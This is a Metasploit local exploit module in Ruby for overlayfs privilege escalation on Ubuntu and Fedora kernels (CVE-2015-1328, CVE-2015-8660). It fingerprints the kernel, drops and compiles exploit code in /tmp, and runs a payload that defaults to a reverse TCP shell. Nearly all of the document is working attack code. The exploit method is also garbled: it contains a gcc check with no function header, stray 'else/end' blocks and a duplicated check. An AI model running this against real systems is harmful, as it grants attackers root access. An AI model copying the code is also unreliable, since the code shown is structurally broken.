# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require "msf/core"
 
class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking
 
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
        &#039;Name&#039;           => &#039;Overlayfs Privilege Escalation&#039;,
        &#039;Description&#039;    => %q{
          This module attempts to exploit two different CVEs related to overlayfs.
          CVE-2015-1328: Ubuntu specific -> 3.13.0-24 (14.04 default) < 3.13.0-55
                                            3.16.0-25 (14.10 default) < 3.16.0-41
                                            3.19.0-18 (15.04 default) < 3.19.0-21
          CVE-2015-8660:
              Ubuntu:
                     3.19.0-18 < 3.19.0-43
                     4.2.0-18 < 4.2.0-23 (14.04.1, 15.10)
              Fedora:
                     < 4.2.8 (vulnerable, un-tested)
              Red Hat:
                     < 3.10.0-327 (rhel 6, vulnerable, un-tested)
        },
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Author&#039;         =>
          [
            &#039;h00die <mike@shorebreaksecurity.com>&#039;,  # Module
            &#039;rebel&#039;                         # Discovery
          ],
        &#039;DisclosureDate&#039; => &#039;Jun 16 2015&#039;,
        &#039;Platform&#039;       => [ &#039;linux&#039;],
        &#039;Arch&#039;           => [ ARCH_X86, ARCH_X86_64 ],
        &#039;Targets&#039;        =>
          [
            [ &#039;CVE-2015-1328&#039;, { } ],
            [ &#039;CVE-2015-8660&#039;, { } ]
          ],
        &#039;DefaultTarget&#039;  => 1,
        &#039;DefaultOptions&#039; =>
          {
            &#039;payload&#039; => &#039;linux/x86/shell/reverse_tcp&#039; # for compatibility due to the need on cve-2015-1328 to run /bin/su
          },
        &#039;References&#039;     =>
          [
            [ &#039;EDB&#039;, &#039;39166&#039;], # CVE-2015-8660
            [ &#039;EDB&#039;, &#039;37292&#039;], # CVE-2015-1328
            [ &#039;CVE&#039;, &#039;2015-1328&#039;],
            [ &#039;CVE&#039;, &#039;2015-8660&#039;]
          ]
      ))
    register_options(
      [
        OptString.new(&#039;WritableDir&#039;, [ true, &#039;A directory where we can write files (must not be mounted noexec)&#039;, &#039;/tmp&#039; ]),
        OptEnum.new(&#039;COMPILE&#039;, [ true, &#039;Compile on target&#039;, &#039;Auto&#039;, [&#039;Auto&#039;, &#039;True&#039;, &#039;False&#039;]])
      ], self.class)
  end
 
  def check
    def mounts_exist?()
      vprint_status(&#039;Checking if mount points exist&#039;)
      if target.name == &#039;CVE-2015-1328&#039;
        if not directory?(&#039;/tmp/ns_sploit&#039;)
          vprint_good(&#039;/tmp/ns_sploit not created&#039;)
          return true
        else
          print_error(&#039;/tmp/ns_sploit directory exists.  Please delete.&#039;)
          return false
        end
      elsif target.name == &#039;CVE-2015-8660&#039;
        if not directory?(&#039;/tmp/haxhax&#039;)
          vprint_good(&#039;/tmp/haxhax not created&#039;)
          return true
        else
          print_error(&#039;/tmp/haxhax directory exists.  Please delete.&#039;)
          return false
        end
      end
    end
 
    def kernel_vuln?()
      os_id = cmd_exec(&#039;grep ^ID= /etc/os-release&#039;)
      case os_id
      when &#039;ID=ubuntu&#039;
        kernel = Gem::Version.new(cmd_exec(&#039;/bin/uname -r&#039;))
        case kernel.release.to_s
        when &#039;3.13.0&#039;
          if kernel.between?(Gem::Version.new(&#039;3.13.0-24-generic&#039;),Gem::Version.new(&#039;3.13.0-54-generic&#039;))
            vprint_good("Kernel #{kernel} is vulnerable to CVE-2015-1328")
            return true
          else
            print_error("Kernel #{kernel} is NOT vulnerable")
            return false
          end
        when &#039;3.16.0&#039;
          if kernel.between?(Gem::Version.new(&#039;3.16.0-25-generic&#039;),Gem::Version.new(&#039;3.16.0-40-generic&#039;))
            vprint_good("Kernel #{kernel} is vulnerable to CVE-2015-1328")
            return true
          else
            print_error("Kernel #{kernel} is NOT vulnerable")
            return false
          end
        when &#039;3.19.0&#039;
          if kernel.between?(Gem::Version.new(&#039;3.19.0-18-generic&#039;),Gem::Version.new(&#039;3.19.0-20-generic&#039;))
            vprint_good("Kernel #{kernel} is vulnerable to CVE-2015-1328")
            return true
          elsif kernel.between?(Gem::Version.new(&#039;3.19.0-18-generic&#039;),Gem::Version.new(&#039;3.19.0-42-generic&#039;))
            vprint_good("Kernel #{kernel} is vulnerable to CVE-2015-8660")
            return true
          else
            print_error("Kernel #{kernel} is NOT vulnerable")
            return false
          end
        when &#039;4.2.0&#039;
          if kernel.between?(Gem::Version.new(&#039;4.2.0-18-generic&#039;),Gem::Version.new(&#039;4.2.0-22-generic&#039;))
            vprint_good("Kernel #{kernel} is vulnerable to CVE-2015-8660")
            return true
          else
            print_error("Kernel #{kernel} is NOT vulnerable")
            return false
          end
        else
          print_error("Non-vuln kernel #{kernel}")
          return false
        end
      when &#039;ID=fedora&#039;
        kernel = Gem::Version.new(cmd_exec(&#039;/usr/bin/uname -r&#039;).sub(/\.fc.*/, &#039;&#039;)) # we need to remove the trailer after .fc
        # irb(main):008:0> &#039;4.0.4-301.fc22.x86_64&#039;.sub(/\.fc.*/, &#039;&#039;)
        # => "4.0.4-301"
        if kernel.release < Gem::Version.new(&#039;4.2.8&#039;)
          vprint_good("Kernel #{kernel} is vulnerable to CVE-2015-8660.  Exploitation UNTESTED")
          return true
        else
          print_error("Non-vuln kernel #{kernel}")
          return false
        end
      else
        print_error("Unknown OS: #{os_id}")
        return false
      end
    end
 
    if mounts_exist?() && kernel_vuln?()
      return CheckCode::Appears
    else
      return CheckCode::Safe
    end
  end
 
  def exploit
 
    if check != CheckCode::Appears
      fail_with(Failure::NotVulnerable, &#039;Target not vulnerable! punt!&#039;)
    end
 
    filename = rand_text_alphanumeric(8)
    executable_path = "#{datastore[&#039;WritableDir&#039;]}/#{filename}"
    payloadname = rand_text_alphanumeric(8)
    payload_path = "#{datastore[&#039;WritableDir&#039;]}/#{payloadname}"
 
      gcc = cmd_exec(&#039;which gcc&#039;)
      if gcc.include?(&#039;gcc&#039;)
        vprint_good(&#039;gcc is installed&#039;)
      else
        print_error(&#039;gcc is not installed.  Compiling will fail.&#039;)
      end
      return gcc.include?(&#039;gcc&#039;)
    end
 
    compile = false
    if datastore[&#039;COMPILE&#039;] == &#039;Auto&#039; || datastore[&#039;COMPILE&#039;] == &#039;True&#039;
        compile = true
        vprint_status(&#039;Live compiling exploit on system&#039;)
      else
      end
    end
    if check != CheckCode::Appears
      fail_with(Failure::NotVulnerable, &#039;Target not vulnerable! punt!&#039;)
    end
 
    def upload_and_chmod(fname, fcontent, cleanup=true)
      print_status "Writing to #{fname} (#{fcontent.size} bytes)"
      rm_f fname
      write_file(fname, fcontent)
      cmd_exec("chmod +x #{fname}")
      if cleanup
        register_file_for_cleanup(fname)
      end
    end
 
    def on_new_session(session)
      super
      if target.name == &#039;CVE-2015-1328&#039;
        # we cleanup here instead of earlier since we needed the /bin/su in our new session
        session.shell_command(&#039;rm -f /tmp/ofs-lib.so&#039;)
      end
    end
 
    if compile
      begin
        if target.name == &#039;CVE-2015-1328&#039;
          # direct copy of code from exploit-db.  There were a bunch of ducplicate header includes I removed, and a lot of the comment title area just to cut down on size
          # Also removed the on-the-fly compilation of ofs-lib.c and we do that manually ahead of time, or drop the binary.
          path = ::File.join( Msf::Config.install_root, &#039;external&#039;, &#039;source&#039;, &#039;exploits&#039;, &#039;CVE-2015-1328&#039;, &#039;1328.c&#039;)
          fd = ::File.open( path, "rb")
          cve_2015_1328 = fd.read(fd.stat.size)
          fd.close
 
          # pulled out from 1328.c&#039;s LIB define
          path = ::File.join( Msf::Config.install_root, &#039;external&#039;, &#039;source&#039;, &#039;exploits&#039;, &#039;CVE-2015-1328&#039;, &#039;ofs-lib.c&#039;)
          fd = ::File.open( path, "rb")
          ofs_lib = fd.read(fd.stat.size)
          fd.close
        else
          # direct copy of code from exploit-db.  There were a bunch of ducplicate header includes I removed, and a lot of the comment title area just to cut down on size
          path = ::File.join( Msf::Config.install_root, &#039;external&#039;, &#039;source&#039;, &#039;exploits&#039;, &#039;CVE-2015-8660&#039;, &#039;8660.c&#039;)
          fd = ::File.open( path, "rb")
          cve_2015_8660 = fd.read(fd.stat.size)
          fd.close
        end
      rescue
        compile = false #hdm said external folder is optional and all module should run even if external is deleted.  If we fail to load, default to binaries
      end
    end
 
 
    if compile
      if target.name == &#039;CVE-2015-1328&#039;
        cve_2015_1328.gsub!(/execl\("\/bin\/su","su",NULL\);/,
                            "execl(\"#{payload_path}\",\"#{payloadname}\",NULL);")
        upload_and_chmod("#{executable_path}.c", cve_2015_1328)
        ofs_path = "#{datastore[&#039;WritableDir&#039;]}/ofs-lib"
        upload_and_chmod("#{ofs_path}.c", ofs_lib)
        cmd_exec("gcc -fPIC -shared -o #{ofs_path}.so #{ofs_path}.c -ldl -w") # compile dependency file
        register_file_for_cleanup("#{ofs_path}.c")
      else
        cve_2015_8660.gsub!(/os.execl\(&#039;\/bin\/bash&#039;,&#039;bash&#039;\)/,
                            "os.execl(&#039;#{payload_path}&#039;,&#039;#{payloadname}&#039;)")
        upload_and_chmod("#{executable_path}.c", cve_2015_8660)
      end
      vprint_status("Compiling #{executable_path}.c")
      cmd_exec("gcc -o #{executable_path} #{executable_path}.c") # compile
      register_file_for_cleanup(executable_path)
    else
      if target.name == &#039;CVE-2015-1328&#039;
        path = ::File.join( Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2015-1328&#039;, &#039;1328&#039;)
        fd = ::File.open( path, "rb")
        cve_2015_1328 = fd.read(fd.stat.size)
        fd.close
        upload_and_chmod(executable_path, cve_2015_1328)
 
        path = ::File.join( Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2015-1328&#039;, &#039;ofs-lib.so&#039;)
        fd = ::File.open( path, "rb")
        ofs_lib = fd.read(fd.stat.size)
        fd.close
        ofs_path = "#{datastore[&#039;WritableDir&#039;]}/ofs-lib"
        # dont auto cleanup or else it happens too quickly and we never escalate ourprivs
        upload_and_chmod("#{ofs_path}.so", ofs_lib, false)
 
        # overwrite with the hardcoded variable names in the compiled versions
        payload_filename = &#039;lXqzVpYN&#039;
        payload_path = &#039;/tmp/lXqzVpYN&#039;
      else
        path = ::File.join( Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2015-8660&#039;, &#039;8660&#039;)
        fd = ::File.open( path, "rb")
        cve_2015_8660 = fd.read(fd.stat.size)
        fd.close
        upload_and_chmod(executable_path, cve_2015_8660)
        # overwrite with the hardcoded variable names in the compiled versions
        payload_filename = &#039;1H0qLaq2&#039;
        payload_path = &#039;/tmp/1H0qLaq2&#039;
      end
    end
 
    upload_and_chmod(payload_path, generate_payload_exe)
    vprint_status(&#039;Exploiting...&#039;)
    output = cmd_exec(executable_path)
    output.each_line { |line| vprint_status(line.chomp) }
  end
end

